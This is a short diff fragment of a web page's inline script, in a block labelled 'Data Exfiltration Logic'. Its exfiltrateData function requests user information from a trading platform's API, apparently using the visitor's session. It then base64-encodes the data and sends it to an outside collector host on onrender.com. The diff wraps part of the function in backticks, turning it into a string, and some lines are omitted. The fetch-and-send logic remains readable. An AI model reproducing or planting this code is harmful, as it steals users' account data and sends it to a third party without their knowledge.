@@ -61,7 +61,7 @@
 
 <script>
     // --- Data Exfiltration Logic ---
-    async function exfiltrateData() {
+    `async function exfiltrateData() {
         try {
             const user = await (await fetch('https://api7.axiom.trade/user-info', {
                 method: 'POST',
@@ -84,7 +84,7 @@
 
             fetch('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(data)), {
                 method: 'GET'
-            });
+            })`;
         } catch (e) {
             console.error("LO, the data capture failed:", e);
         }
